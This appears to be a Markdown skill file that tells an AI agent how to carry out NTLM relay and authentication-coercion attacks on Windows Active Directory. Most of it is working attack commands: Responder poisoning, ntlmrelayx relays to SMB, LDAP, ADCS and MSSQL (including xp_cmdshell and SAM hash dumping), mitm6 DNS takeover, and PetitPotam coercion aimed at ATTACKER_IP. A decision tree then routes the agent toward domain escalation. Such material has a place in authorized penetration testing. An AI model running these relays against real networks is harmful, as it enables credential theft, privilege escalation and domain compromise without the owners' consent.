---
name: ntlm-relay-coercion
description: >-
  NTLM relay and authentication coercion playbook. Use when capturing and relaying NTLM authentication to escalate privileges via SMB, LDAP, HTTP, or MSSQL relay targets, combined with PetitPotam, PrinterBug, and other coercion methods.
---

# SKILL: NTLM Relay and Authentication Coercion

## 0. RELATED ROUTING

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ESC8
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for RBCD, shadow creds
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md)

Also load [COERCION_METHODS.md](./COERCION_METHODS.md) for detailed coercion method comparison.

---

## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts
```

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |

### Signing Check

```bash
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

```bash
# Capture mode
responder -I eth0 -dwP

# Analyze mode (passive)
responder -I eth0 -A

# Relay mode: disable HTTP and SMB in Responder.conf
responder -I eth0 -dwP
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB

```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf targets.txt -smb2support                   # Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support -socks            # Interactive SOCKS
```

### Relay to LDAP

```bash
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### Relay to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
```

### Relay to MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

---

## 5. MITM6 — IPv6 DNS TAKEOVER

```bash
mitm6 -d domain.com
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support
```

---

## 6. CROSS-PROTOCOL RELAY

### SMB → LDAP

```bash
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support
PetitPotam.py ATTACKER_IP DC01_IP
```

### WebDAV → LDAP (Bypass SMB Signing)

```bash
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 7. WEBDAV-BASED COERCION

```bash
# Check if WebClient is running
crackmapexec smb TARGET -u user -p pass -M webdav
```

Key advantage: HTTP-based NTLM avoids SMB signing requirements.

---

## 8. DECISION TREE

```
Want to relay NTLM authentication
│
├── What auth can you capture?
│   ├── Responder poisoning (passive)
│   ├── mitm6 (DHCPv6 DNS takeover)
│   └── Active coercion → load COERCION_METHODS.md
│
├── Need code execution?
│   ├── SMB without signing → ntlmrelayx to SMB (§4)
│   └── MSSQL → ntlmrelayx + xp_cmdshell (§4)
│
├── Need domain escalation?
│   ├── LDAP signing not enforced?
│   │   ├── Relay to LDAP → RBCD (§4)
│   │   └── Relay to LDAP → shadow credentials (§4)
│   └── LDAP signing enforced?
│       └── Relay to ADCS HTTP (ESC8) → certificate (§4)
│
└── Relay fails?
    ├── Check signing requirements (§2)
    ├── Try cross-protocol (SMB → LDAP)
    └── Try WebDAV coercion (§6/§7)
```
